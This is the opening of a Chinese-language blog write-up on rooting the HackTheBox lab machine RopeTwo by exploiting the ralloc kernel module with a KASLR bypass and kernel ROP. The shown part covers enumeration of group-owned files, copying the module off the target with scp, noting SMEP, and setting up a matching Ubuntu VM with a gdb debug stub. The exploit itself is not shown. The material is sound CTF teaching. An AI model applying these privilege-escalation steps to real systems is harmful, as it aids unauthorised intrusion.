<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width">
<meta name="theme-color" content="#222" media="(prefers-color-scheme: light)">
<meta name="theme-color" content="#222" media="(prefers-color-scheme: dark)"><meta name="generator" content="Hexo 6.3.0">

  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">

<link rel="stylesheet" href="https://fonts.lug.ustc.edu.cn/css?family=Noto+Serif+SC:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">

<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.3.0/css/all.min.css" integrity="sha256-/4UQcSmErDzPCMAiuOiWPVVsNN2s3ZY/NsmXNcj0IFc=" crossorigin="anonymous">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/themes/blue/pace-theme-minimal.css">
  <script src="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/pace.min.js" integrity="sha256-gqd7YTjg/BtfqWSwsJOvndl0Bxc8gFImLEkXQT8+qj0=" crossorigin="anonymous"></script>

<script class="next-config" data-name="main" type="application/json">{"hostname":"fdlucifer.github.io","root":"/","images":"/images","scheme":"Muse","darkmode":true,"version":"8.15.0","exturl":true,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":{"enable":true,"style":"mac"},"bookmark":{"enable":true,"color":"#222","save":"auto"},"mediumzoom":true,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":true,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"},"path":"/search.json","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":true,"preload":true}}</script><script src="/js/config.js"></script>

    <meta name="description" content="前言此篇文章专门记录hack the box - ropetwo机器中获取root权限的ralloc KASLR linux内核堆ROP利用部分。  到这一步之前，建议先看前两个步骤: HackTheBox-RopeTwo-[PWN-Chrome-V8引擎] HackTheBox-RopeTwo-[pwn-rshell]  本篇文章是hackthebox - ropetwo机器的最后一个部分, 进">
<meta property="og:type" content="article">
<meta property="og:title" content="HackTheBox-RopeTwo-[ralloc-KASLR-kernel-ROP]">
<meta property="og:url" content="https://fdlucifer.github.io/2021/02/27/hackthebox-rope2-getroot/index.html">
<meta property="og:site_name" content="fdvoid0&#39;s blog">
<meta property="og:description" content="前言此篇文章专门记录hack the box - ropetwo机器中获取root权限的ralloc KASLR linux内核堆ROP利用部分。  到这一步之前，建议先看前两个步骤: HackTheBox-RopeTwo-[PWN-Chrome-V8引擎] HackTheBox-RopeTwo-[pwn-rshell]  本篇文章是hackthebox - ropetwo机器的最后一个部分, 进">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb-rope2-getroot.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb-rope2-getroot1.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb-rope2-getroot2.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb-rope2-getroot3.jpg">
<meta property="article:published_time" content="2021-02-26T18:37:37.000Z">
<meta property="article:modified_time" content="2021-02-27T23:07:47.272Z">
<meta property="article:author" content="fdvoid0">
<meta property="article:tag" content="pwn">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb-rope2-getroot.jpg">


<link rel="canonical" href="https://fdlucifer.github.io/2021/02/27/hackthebox-rope2-getroot/">



<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"en","comments":true,"permalink":"https://fdlucifer.github.io/2021/02/27/hackthebox-rope2-getroot/","path":"2021/02/27/hackthebox-rope2-getroot/","title":"HackTheBox-RopeTwo-[ralloc-KASLR-kernel-ROP]"}</script>

<script class="next-config" data-name="calendar" type="application/json">""</script>
<title>HackTheBox-RopeTwo-[ralloc-KASLR-kernel-ROP] | fdvoid0's blog</title>
  








  <noscript>
    <link rel="stylesheet" href="/css/noscript.css">
  </noscript>
<link rel="alternate" href="/atom.xml" title="fdvoid0's blog" type="application/atom+xml">
</head>

<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
  <div class="headband"></div>

  <main class="main">
    <div class="column">
      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="Toggle navigation bar" role="button">
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <i class="logo-line"></i>
      <p class="site-title">fdvoid0's blog</p>
      <i class="logo-line"></i>
    </a>
      <p class="site-subtitle" itemprop="description">by fdvoid0</p>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger" aria-label="Search" role="button">
        <i class="fa fa-search fa-fw fa-lg"></i>
    </div>
  </div>
</div>



<nav class="site-nav">
  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>About</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags<span class="badge">43</span></a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories<span class="badge">54</span></a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives<span class="badge">212</span></a></li><li class="menu-item menu-item-commonweal"><a href="/404/" rel="section"><i class="fa fa-heartbeat fa-fw"></i>Commonweal 404</a></li>
      <li class="menu-item menu-item-search">
        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>Search
        </a>
      </li>
  </ul>
</nav>



  <div class="search-pop-overlay">
    <div class="popup search-popup"><div class="search-header">
  <span class="search-icon">
    <i class="fa fa-search"></i>
  </span>
  <div class="search-input-container">
    <input autocomplete="off" autocapitalize="off" maxlength="80"
           placeholder="Searching..." spellcheck="false"
           type="search" class="search-input">
  </div>
  <span class="popup-btn-close" role="button">
    <i class="fa fa-times-circle"></i>
  </span>
</div>
<div class="search-result-container no-result">
  <div class="search-result-icon">
    <i class="fa fa-spinner fa-pulse fa-5x"></i>
  </div>
</div>

    </div>
  </div>

</header>
        
  
  <aside class="sidebar">

    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
      <ul class="sidebar-nav">
        <li class="sidebar-nav-toc">
          Table of Contents
        </li>
        <li class="sidebar-nav-overview">
          Overview
        </li>
      </ul>

      <div class="sidebar-panel-container">
        <!--noindex-->
        <div class="post-toc-wrap sidebar-panel">
            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%9E%9A%E4%B8%BE"><span class="nav-number">2.</span> <span class="nav-text">枚举</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%9C%AC%E5%9C%B0%E9%85%8D%E7%BD%AE"><span class="nav-number">3.</span> <span class="nav-text">本地配置</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%90%AD%E5%BB%BAVM"><span class="nav-number">3.1.</span> <span class="nav-text">搭建VM</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%AE%89%E8%A3%85ralloc"><span class="nav-number">3.2.</span> <span class="nav-text">安装ralloc</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#gdb"><span class="nav-number">3.3.</span> <span class="nav-text">gdb</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90"><span class="nav-number">4.</span> <span class="nav-text">静态分析</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%80%9A%E7%94%A8%E7%BB%93%E6%9E%84"><span class="nav-number">4.1.</span> <span class="nav-text">通用结构</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#IOCTL"><span class="nav-number">4.2.</span> <span class="nav-text">IOCTL</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%BB%93%E6%9E%84"><span class="nav-number">4.3.</span> <span class="nav-text">结构</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#rope2-ioctl"><span class="nav-number">4.4.</span> <span class="nav-text">rope2_ioctl</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%9F%BA%E6%9C%AC%E7%9B%B8%E4%BA%92%E4%BD%9C%E7%94%A8"><span class="nav-number">5.</span> <span class="nav-text">基本相互作用</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#KASLR-Defeat"><span class="nav-number">6.</span> <span class="nav-text">KASLR Defeat</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%AD%96%E7%95%A5"><span class="nav-number">6.1.</span> <span class="nav-text">策略</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%AE%9E%E7%8E%B0"><span class="nav-number">6.2.</span> <span class="nav-text">实现</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%8E%A7%E5%88%B6RIP"><span class="nav-number">7.</span> <span class="nav-text">控制RIP</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%AD%96%E7%95%A5-1"><span class="nav-number">7.1.</span> <span class="nav-text">策略</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%AE%9E%E7%8E%B0-1"><span class="nav-number">7.2.</span> <span class="nav-text">实现</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ROP"><span class="nav-number">8.</span> <span class="nav-text">ROP</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%A0%86%E6%A0%88%E4%B8%AD%E6%9E%A2"><span class="nav-number">8.1.</span> <span class="nav-text">堆栈中枢</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%9D%83%E9%99%90"><span class="nav-number">8.2.</span> <span class="nav-text">权限</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#ROP-1"><span class="nav-number">8.3.</span> <span class="nav-text">ROP</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%A7%A6%E5%8F%91"><span class="nav-number">8.4.</span> <span class="nav-text">触发</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#shell"><span class="nav-number">9.</span> <span class="nav-text">shell</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Extra-%E9%9D%9E%E9%A2%84%E6%9C%9F%E8%8E%B7%E5%8F%96root%E7%9A%84%E6%96%B9%E6%B3%95"><span class="nav-number">10.</span> <span class="nav-text">Extra - 非预期获取root的方法</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%AF%BB%E6%89%BE%E6%BC%8F%E6%B4%9E"><span class="nav-number">10.1.</span> <span class="nav-text">寻找漏洞</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%AE%89%E8%A3%85%E6%97%A7%E7%9A%84apport"><span class="nav-number">11.</span> <span class="nav-text">安装旧的apport</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#exploit"><span class="nav-number">12.</span> <span class="nav-text">exploit</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%83%8C%E6%99%AF"><span class="nav-number">12.1.</span> <span class="nav-text">背景</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%BB%83%E4%B9%A0"><span class="nav-number">12.2.</span> <span class="nav-text">练习</span></a></li></ol></li></ol></div>
        </div>
        <!--/noindex-->

        <div class="site-overview-wrap sidebar-panel">
          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="fdvoid0"
      src="/images/blackhole.png">
  <p class="site-author-name" itemprop="name">fdvoid0</p>
  <div class="site-description" itemprop="description">All things about infosec & ctf</div>
</div>
<div class="site-state-wrap animated">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
        <a href="/archives/">
          <span class="site-state-item-count">212</span>
          <span class="site-state-item-name">posts</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
          <a href="/categories/">
        <span class="site-state-item-count">54</span>
        <span class="site-state-item-name">categories</span></a>
      </div>
      <div class="site-state-item site-state-tags">
          <a href="/tags/">
        <span class="site-state-item-count">43</span>
        <span class="site-state-item-name">tags</span></a>
      </div>
  </nav>
</div>
  <div class="links-of-author animated">
      <span class="links-of-author-item">
        <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0ZEbHVjaWZlcg==" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;FDlucifer"><i class="fab fa-github fa-fw"></i>GitHub</span>
      </span>
      <span class="links-of-author-item">
        <span class="exturl" data-url="bWFpbHRvOjExODUxNTE4NjdAcXEuY29t" title="E-Mail → mailto:1185151867@qq.com"><i class="fa fa-envelope fa-fw"></i>E-Mail</span>
      </span>
      <span class="links-of-author-item">
        <span class="exturl" data-url="aHR0cHM6Ly90d2l0dGVyLmNvbS9mZGx1Y2lmZXIxMQ==" title="Twitter → https:&#x2F;&#x2F;twitter.com&#x2F;fdlucifer11"><i class="fab fa-twitter fa-fw"></i>Twitter</span>
      </span>
      <span class="links-of-author-item">
        <span class="exturl" data-url="aHR0cHM6Ly93d3cuZmFjZWJvb2suY29tL3Byb2ZpbGUucGhwP2lkPTEwMDAxOTY5NDUyODYyMA==" title="FB Page → https:&#x2F;&#x2F;www.facebook.com&#x2F;profile.php?id&#x3D;100019694528620"><i class="fab fa-facebook fa-fw"></i>FB Page</span>
      </span>
      <span class="links-of-author-item">
        <span class="exturl" data-url="aHR0cHM6Ly93d3cueW91dHViZS5jb20vQGZkdm9pZDA=" title="YouTube → https:&#x2F;&#x2F;www.youtube.com&#x2F;@fdvoid0"><i class="fab fa-youtube fa-fw"></i>YouTube</span>
      </span>
      <span class="links-of-author-item">
        <span class="exturl" data-url="aHR0cHM6Ly93d3cuaW5zdGFncmFtLmNvbS95YW5nODkyOS8=" title="Instagram → https:&#x2F;&#x2F;www.instagram.com&#x2F;yang8929&#x2F;"><i class="fab fa-instagram fa-fw"></i>Instagram</span>
      </span>
      <span class="links-of-author-item">
        <span class="exturl" data-url="aHR0cHM6Ly9pbmZvc2VjLmV4Y2hhbmdlL0BsVWMxZjNyMTE=" title="infosec.exchange → https:&#x2F;&#x2F;infosec.exchange&#x2F;@lUc1f3r11"><i class="fa fa-stack-exchange fa-fw"></i>infosec.exchange</span>
      </span>
  </div>
  <div class="cc-license animated" itemprop="license">
    <span class="exturl cc-opacity" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC9kZWVkLnpo"><img src="https://cdnjs.cloudflare.com/ajax/libs/creativecommons-vocabulary/2020.11.3/assets/license_badges/big/by_nc_sa.svg" alt="Creative Commons"></span>
  </div>

        </div>
      </div>
        <div class="back-to-top animated" role="button" aria-label="Back to top">
          <i class="fa fa-arrow-up"></i>
          <span>0%</span>
        </div>
    </div>

    
    <div class="sidebar-inner sidebar-blogroll">
      <div class="links-of-blogroll animated">
        <div class="links-of-blogroll-title"><i class="fa fa-globe fa-fw"></i>
          Links
        </div>
        <ul class="links-of-blogroll-list">
            <li class="links-of-blogroll-item">
              <span class="exturl" data-url="aHR0cHM6Ly9hdHN1ZDAubWUv" title="https:&#x2F;&#x2F;atsud0.me&#x2F;">atsud0</span>
            </li>
            <li class="links-of-blogroll-item">
              <span class="exturl" data-url="aHR0cHM6Ly9kcm9pZGthbGkuZ2l0aHViLmlvLw==" title="https:&#x2F;&#x2F;droidkali.github.io&#x2F;">记忆里的纯真</span>
            </li>
            <li class="links-of-blogroll-item">
              <span class="exturl" data-url="aHR0cHM6Ly94aWFvbGltYXJzLndvcmRwcmVzcy5jb20v" title="https:&#x2F;&#x2F;xiaolimars.wordpress.com&#x2F;">小离</span>
            </li>
        </ul>
      </div>
    </div>
  </aside>


    </div>

    <div class="main-inner post posts-expand">


  


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="en">
    <link itemprop="mainEntityOfPage" href="https://fdlucifer.github.io/2021/02/27/hackthebox-rope2-getroot/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/blackhole.png">
      <meta itemprop="name" content="fdvoid0">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="fdvoid0's blog">
      <meta itemprop="description" content="All things about infosec & ctf">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="HackTheBox-RopeTwo-[ralloc-KASLR-kernel-ROP] | fdvoid0's blog">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          HackTheBox-RopeTwo-[ralloc-KASLR-kernel-ROP]
        </h1>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">Posted on</span>

      <time title="Created: 2021-02-27 02:37:37" itemprop="dateCreated datePublished" datetime="2021-02-27T02:37:37+08:00">2021-02-27</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar-check"></i>
      </span>
      <span class="post-meta-item-text">Edited on</span>
      <time title="Modified: 2021-02-28 07:07:47" itemprop="dateModified" datetime="2021-02-28T07:07:47+08:00">2021-02-28</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">In</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/pwn/" itemprop="url" rel="index"><span itemprop="name">pwn</span></a>
        </span>
          , 
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/pwn/%E9%80%86%E5%90%91/" itemprop="url" rel="index"><span itemprop="name">逆向</span></a>
        </span>
    </span>

  
    <span class="post-meta-item" title="Views" id="busuanzi_container_page_pv">
      <span class="post-meta-item-icon">
        <i class="far fa-eye"></i>
      </span>
      <span class="post-meta-item-text">Views: </span>
      <span id="busuanzi_value_page_pv"></span>
    </span>
    <span class="post-meta-break"></span>
    <span class="post-meta-item" title="Word count in article">
      <span class="post-meta-item-icon">
        <i class="far fa-file-word"></i>
      </span>
      <span class="post-meta-item-text">Word count in article: </span>
      <span>6.9k</span>
    </span>
    <span class="post-meta-item" title="Reading time">
      <span class="post-meta-item-icon">
        <i class="far fa-clock"></i>
      </span>
      <span class="post-meta-item-text">Reading time &asymp;</span>
      <span>25 mins.</span>
    </span>
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
        <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>此篇文章专门记录hack the box - ropetwo机器中获取root权限的ralloc KASLR linux内核堆ROP利用部分。</p>
<ul>
<li>到这一步之前，建议先看前两个步骤:</li>
<li><a href="https://fdlucifer.github.io/2021/01/23/chrome-browserv8-pwn/">HackTheBox-RopeTwo-[PWN-Chrome-V8引擎]</a></li>
<li><a href="https://fdlucifer.github.io/2021/02/18/hackthebox-rope2-rshell-exploit/">HackTheBox-RopeTwo-[pwn-rshell]</a></li>
</ul>
<p>本篇文章是hackthebox - ropetwo机器的最后一个部分, 进行内核调试漏洞利用。</p>
<span id="more"></span>

<h2 id="枚举"><a href="#枚举" class="headerlink" title="枚举"></a>枚举</h2><p>当在寻找从chromeuser升级到r4j的方法时，运行了一个find查询来查找r4j拥有的文件。在上面展示了对该用户拥有的文件的搜索，对r4j组拥有的文件的搜索还返回了一些有趣的东西:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">r4j@rope2:~$ find / -<span class="built_in">type</span> f -group r4j -<span class="built_in">ls</span> 2&gt;/dev/null | grep -v -e <span class="string">&quot; \/proc&quot;</span> -e <span class="string">&quot; \/sys&quot;</span></span><br><span class="line">  1054414      8 -rw-r-----   1 root     r4j          5856 Jun  1  2020 /usr/lib/modules/5.0.0-38-generic/kernel/drivers/ralloc/ralloc.ko</span><br><span class="line">  1056436     16 -rwsr-xr-x   1 r4j      r4j         14312 Feb 24  2020 /usr/bin/rshell</span><br><span class="line">  1054405      4 -rwx------   1 r4j      r4j          3771 Apr  4  2019 /home/r4j/.bashrc</span><br><span class="line">  1056441      4 -rw-r-----   1 root     r4j            33 Feb 26 17:52 /home/r4j/user.txt</span><br><span class="line">  1054406      4 -rwx------   1 r4j      r4j           807 Apr  4  2019 /home/r4j/.profile</span><br><span class="line">  1054407      4 -rwx------   1 r4j      r4j           220 Apr  4  2019 /home/r4j/.bash_logout</span><br><span class="line">  1054423      0 -rw-r--r--   1 r4j      r4j             0 Feb 23  2020 /home/r4j/.cache/motd.legal-displayed</span><br></pre></td></tr></table></figure>

<p>ralloc.ko是一个内核模块。在&#x2F;dev中有一个匹配的设备:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">r4j@rope2:/dev$ <span class="built_in">ls</span> -l ralloc</span><br><span class="line">crw-r--r-- 1 root root 10, 52 Feb 26 17:52 ralloc</span><br></pre></td></tr></table></figure>

<p>使用scp获取模块的副本:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/hackthebox/machine/rope2]</span><br><span class="line">└─<span class="comment"># scp -i id_rsa r4j@10.10.10.196:/usr/lib/modules/5.0.0-38-generic/kernel/drivers/ralloc/ralloc.ko .</span></span><br><span class="line">ralloc.ko                                                                                                          100% 5856    20.2KB/s   00:00    </span><br><span class="line">┌──(root💀kali)-[~/hackthebox/machine/rope2]</span><br><span class="line">└─<span class="comment"># ls</span></span><br><span class="line">chrome  gdb-rshell.init  id_rsa.pub            libc-2.29.so-debug                 libc.so.6-ropetwo  pwn_rshell.py  rshell    xpl.js</span><br><span class="line">exp.py  id_rsa           ld-linux-x86-64.so.2  libc6-dbg_2.29-0ubuntu2_amd64.deb  patch.diff         ralloc.ko      xpl.html</span><br></pre></td></tr></table></figure>

<p>还需要一些关于RopeTwo的额外信息，以便复制环境。操作系统和内核版本:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">r4j@rope2:~$ <span class="built_in">cat</span> /etc/lsb-release</span><br><span class="line">DISTRIB_ID=Ubuntu</span><br><span class="line">DISTRIB_RELEASE=19.04</span><br><span class="line">DISTRIB_CODENAME=disco</span><br><span class="line">DISTRIB_DESCRIPTION=<span class="string">&quot;Ubuntu 19.04&quot;</span></span><br><span class="line">r4j@rope2:~$ <span class="built_in">uname</span> -a</span><br><span class="line">Linux rope2 5.0.0-38-generic <span class="comment">#41-Ubuntu SMP Tue Dec 3 00:27:35 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux</span></span><br></pre></td></tr></table></figure>

<p>查看内核正在运行的保护，查看&#x2F;proc&#x2F;cpuinfo。对于每个处理器，都看到了flag smep，它代表<span class="exturl" data-url="aHR0cHM6Ly9lbi53aWtpcGVkaWEub3JnL3dpa2kvU3VwZXJ2aXNvcl9Nb2RlX0FjY2Vzc19QcmV2ZW50aW9u">监督模式执行保护<i class="fa fa-external-link-alt"></i></span>。这意味着不能在内核中运行用户空间代码。相反，需要在漏洞开发利用过程中使用ROP来实现目标。</p>
<h2 id="本地配置"><a href="#本地配置" class="headerlink" title="本地配置"></a>本地配置</h2><p>因为内核模块是特定于内核的，所以想在本地VM中创建相同的环境。要访问Linux主机，最简单的方法是使用QEMU。这篇<span class="exturl" data-url="aHR0cHM6Ly93d3cubnVsbGJ5dGUuY2F0L3Bvc3QvbGludXgta2VybmVsLWV4cGxvaXQtZGV2ZWxvcG1lbnQtZW52aXJvbm1lbnQvI2Vudmlyb25tZW50LXNldHVw">博文<i class="fa fa-external-link-alt"></i></span>详细介绍了这个过程，但是本篇文章使用ubuntu 19.04 vm虚拟机系统来调试。</p>
<h3 id="搭建VM"><a href="#搭建VM" class="headerlink" title="搭建VM"></a>搭建VM</h3><p>下载<span class="exturl" data-url="aHR0cDovL29sZC1yZWxlYXNlcy51YnVudHUuY29tL3JlbGVhc2VzL2Rpc2NvLw==">Ubuntu 19.04的iso<i class="fa fa-external-link-alt"></i></span>，抓取了non-live的iso，并构建了一个新的VM。让它处于NAT模式，但添加了<span class="exturl" data-url="aHR0cHM6Ly9oaXRjaGhpa2luZ3RoZXdlYi53b3JkcHJlc3MuY29tLzIwMTQvMDkvMDIvcG9ydGZvcndhcmRpbmctd2l0aC12bXdhcmUtcGxheWVyLWFuZC1uYXQv">端口转发<i class="fa fa-external-link-alt"></i></span>，这样就可以SSH进入它, 也可以自己配置sshd来连接ssh。</p>
<p>安装好之后，虚拟机已经运行的内核:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~<span class="comment"># uname -a</span></span><br><span class="line">Linux ubuntu 5.0.0-13-generic <span class="comment">#41-Ubuntu SMP Tue Dec 3 00:27:35 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux</span></span><br></pre></td></tr></table></figure>

<p>如果没有的话，它可以通过apt获得，所以可以使用sudo apt install linux-image-5.0.0-38-generic进行安装。</p>
<ul>
<li>注意这里更新源要使用old-release的源，否则安装内核不成功，其他方法安装内核容易报错。</li>
</ul>
<p>还需要调试symbols包，从<span class="exturl" data-url="aHR0cDovL2xhdW5jaHBhZGxpYnJhcmlhbi5uZXQvNDU0MDI4NDcyL2xpbnV4LWltYWdlLXVuc2lnbmVkLTUuMC4wLTM4LWdlbmVyaWMtZGJnc3ltXzUuMC4wLTM4LjQxX2FtZDY0LmRkZWI=">这里<i class="fa fa-external-link-alt"></i></span>获取并安装(花了一些时间):</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~<span class="comment"># dpkg -i linux-image-unsigned-5.0.0-38-generic-dbgsym_5.0.0-38.41_amd64.ddeb</span></span><br><span class="line">Selecting previously unselected package linux-image-unsigned-5.0.0-38-generic-dbgsym.</span><br><span class="line">(Reading database ... 171311 files and directories currently installed.)</span><br><span class="line">Preparing to unpack linux-image-unsigned-5.0.0-38-generic-dbgsym_5.0.0-38.41_amd64.ddeb ...</span><br><span class="line">Unpacking linux-image-unsigned-5.0.0-38-generic-dbgsym (5.0.0-38.41) ...</span><br><span class="line">Setting up linux-image-unsigned-5.0.0-38-generic-dbgsym (5.0.0-38.41) ...</span><br></pre></td></tr></table></figure>

<p>要做的最后一件事是进入这个虚拟机的.vmx文件并添加:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">debugStub.listen.guest64 = <span class="string">&quot;TRUE&quot;</span></span><br></pre></td></tr></table></figure>

<p>这会在主机127.0.0.1:8864上启动一个监听器，可以将gdb连接到这个监听器上。如果需要从另一个主机连接，可以添加第二行:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">debugStub.listen.guest64.remote = <span class="string">&quot;TRUE&quot;</span></span><br></pre></td></tr></table></figure>

<p>如果有这一行，监听器将在0.0.0.0:8864上。</p>
<p>如果因为某些原因想改变端口，这样做(但将只使用默认端口):</p>
